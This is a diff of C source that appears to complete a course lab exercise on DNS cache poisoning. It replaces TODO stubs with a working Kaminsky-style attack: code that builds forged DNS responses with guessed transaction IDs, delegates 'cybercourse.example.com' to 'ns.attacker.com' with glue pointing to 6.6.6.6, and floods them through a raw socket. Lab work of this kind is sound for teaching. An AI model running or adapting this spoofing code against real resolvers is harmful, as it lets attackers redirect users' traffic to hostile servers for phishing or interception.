@@ -324,15 +324,21 @@ static void cleanup_raw_socket(void)
     }
 }
 
-/* Generate a unique subdomain for this round, e.g. ww<round>.example1... */
+/**
+ * build_unique_subdomain - Generate unique subdomain for each attack round
+ * @round: Round number to incorporate into subdomain
+ * @buf: Output buffer for the subdomain string
+ * @buf_len: Size of output buffer
+ * 
+ * Creates subdomains like: www.example0.cybercourse.example.com,
+ * www.example1.cybercourse.example.com, etc.
+ * 
+ * Each round needs a unique subdomain to avoid cache hits from previous
+ * rounds, giving us a fresh attack window.
+ */
 static void build_unique_subdomain(int round, char *buf, size_t buf_len)
 {
-    /* TODO: snprintf into buf something like:
-     * ww<round>.example1.cybercourse.example.com
-     */
-    (void)round;
-    (void)buf;
-    (void)buf_len;
+    snprintf(buf, buf_len, "www.example%d.cybercourse.example.com", round);
 }
 
 /**
@@ -466,25 +472,108 @@ static int learn_resolver_source_port(void)
     return 0;
 }
 
-/* Build a single spoofed DNS response (Kaminsky-style payload) for a given query name.
- * The result is a raw buffer in wire format ready to be injected with pcap.
+/**
+ * build_spoofed_response - Create malicious DNS response for Kaminsky attack
+ * @qname: Query name being spoofed (e.g., www.example0.cybercourse.example.com)
+ * @txid_guess: Guessed transaction ID to match resolver's query
+ * @out_buf: Output buffer for serialized DNS packet (caller must free)
+ * @out_len: Output length of serialized packet
+ * 
+ * Builds a DNS response that includes:
+ * - Answer section: A record for the queried domain
+ * - Authority section: NS record claiming cybercourse.example.com delegates to attacker
+ * - Additional section: A record mapping attacker's NS to malicious IP (6.6.6.6)
+ * 
+ * This is the core Kaminsky payload that poisons the cache.
+ * 
+ * Returns: 0 on success, -1 on failure
  */
 static int build_spoofed_response(const char *qname,
                                   uint16_t txid_guess,
                                   uint8_t **out_buf,
                                   size_t *out_len)
 {
-    /* TODO:
-     * 1. Use ldns_pkt_new() to create a DNS response packet.
-     * 2. Set header (id = txid_guess, QR=1, AA=1, וכו').
-     * 3. Add answer/authority/additional RRs to carry NS + A records (Kaminsky payload).
-     * 4. Use ldns_pkt2wire() to serialize into *out_buf and set *out_len.
-     */
-    (void)qname;
-    (void)txid_guess;
-    (void)out_buf;
-    (void)out_len;
-    return 0;
+    ldns_pkt *response = NULL;
+    ldns_rr *answer_rr = NULL;
+    ldns_rr *authority_rr = NULL;
+    ldns_rr *additional_rr = NULL;
+    ldns_status status;
+    int ret = -1;
+    
+    // Create new DNS packet
+    response = ldns_pkt_new();
+    if (!response) {
+        fprintf(stderr, "Failed to create DNS packet\n");
+        return -1;
+    }
+    
+    // Set DNS header fields
+    ldns_pkt_set_id(response, txid_guess);
+    ldns_pkt_set_qr(response, 1);              // QR=1 (response)
+    ldns_pkt_set_aa(response, 1);              // AA=1 (authoritative)
+    ldns_pkt_set_rd(response, 1);              // RD=1 (recursion desired, copied from query)
+    ldns_pkt_set_ra(response, 1);              // RA=1 (recursion available)
+    ldns_pkt_set_opcode(response, LDNS_PACKET_QUERY);
+    ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);
+    
+    // Add question section (copy from original query)
+    ldns_rdf *qname_rdf = ldns_dname_new_frm_str(qname);
+    if (!qname_rdf) {
+        fprintf(stderr, "Failed to create domain name\n");
+        goto cleanup;
+    }
+    
+    ldns_rr *question = ldns_rr_new();
+    ldns_rr_set_owner(question, qname_rdf);
+    ldns_rr_set_type(question, LDNS_RR_TYPE_A);
+    ldns_rr_set_class(question, LDNS_RR_CLASS_IN);
+    ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);
+    ldns_pkt_set_qdcount(response, 1);
+    
+    // Answer section: A record for the queried domain
+    answer_rr = ldns_rr_new();
+    ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
+    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
+    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
+    ldns_rr_set_ttl(answer_rr, 86400); // 24 hours TTL
+    ldns_rr_push_rdf(answer_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4"));
+    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr);
+    
+    // Authority section: NS record for parent domain (Kaminsky payload)
+    // This is the critical part - claim cybercourse.example.com delegates to attacker
+    authority_rr = ldns_rr_new();
+    ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("cybercourse.example.com"));
+    ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
+    ldns_rr_set_class(authority_rr, LDNS_RR_CLASS_IN);
+    ldns_rr_set_ttl(authority_rr, 86400);
+    ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("ns.attacker.com"));
+    ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, authority_rr);
+    
+    // Additional section: A record for attacker's nameserver (glue record)
+    // This is what actually poisons the cache with the malicious IP
+    additional_rr = ldns_rr_new();
+    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("ns.attacker.com"));
+    ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
+    ldns_rr_set_class(additional_rr, LDNS_RR_CLASS_IN);
+    ldns_rr_set_ttl(additional_rr, 86400);
+    ldns_rr_push_rdf(additional_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "6.6.6.6"));
+    ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, additional_rr);
+    
+    // Serialize to wire format
+    status = ldns_pkt2wire(out_buf, response, out_len);
+    if (status != LDNS_STATUS_OK) {
+        fprintf(stderr, "Failed to serialize DNS packet: %s\n",
+                ldns_get_errorstr_by_id(status));
+        goto cleanup;
+    }
+    
+    ret = 0;
+    
+cleanup:
+    if (response) {
+        ldns_pkt_free(response);
+    }
+    return ret;
 }
 
 /* Inject one spoofed packet into the network via raw socket. */
@@ -574,11 +663,47 @@ static void perform_attack_round(int round)
     build_unique_subdomain(round, subdomain, sizeof(subdomain));
 
     /* Step 1: send query to resolver */
+    printf("[Round %d] Querying resolver for: %s\n", round, subdomain);
     (void)send_dns_query_to_resolver(subdomain);
 
     /* Step 2: flood with spoofed answers trying different TXIDs */
-    /* NOTE: Do not exceed MAX_SPOOFED_PKTS total (per exercise requirement). */
-    /* TODO: loop over txid guesses, build spoofed packet, inject via pcap. */
+    printf("[Round %d] Flooding with up to %d spoofed responses...\n", 
+           round, MAX_SPOOFED_PKTS);
+    
+    uint8_t *spoofed_dns = NULL;
+    size_t spoofed_len = 0;
+    int successful_injections = 0;
+    
+    for (uint32_t i = 0; i < MAX_SPOOFED_PKTS; i++) {
+        // Try different TXID values across the 16-bit space
+        // We cycle through all possible values multiple times
+        uint16_t txid_guess = (uint16_t)(i & 0xFFFF);
+        
+        // Build spoofed DNS response with guessed TXID
+        if (build_spoofed_response(subdomain, txid_guess, 
+                                   &spoofed_dns, &spoofed_len) < 0) {
+            continue; // Skip this TXID on error
+        }
+        
+        // Inject the spoofed packet via raw socket
+        if (inject_spoofed_packet(spoofed_dns, spoofed_len) == 0) {
+            successful_injections++;
+        }
+        
+        // Free the allocated DNS buffer
+        if (spoofed_dns) {
+            free(spoofed_dns);
+            spoofed_dns = NULL;
+        }
+        
+        // Optional: Print progress every 10000 packets
+        if ((i + 1) % 10000 == 0) {
+            printf("  Sent %u/%d packets...\n", i + 1, MAX_SPOOFED_PKTS);
+        }
+    }
+    
+    printf("[Round %d] Injection complete: %d/%d packets sent successfully\n",
+           round, successful_injections, MAX_SPOOFED_PKTS);
 }
 
 /* Check if poisoning succeeded by querying
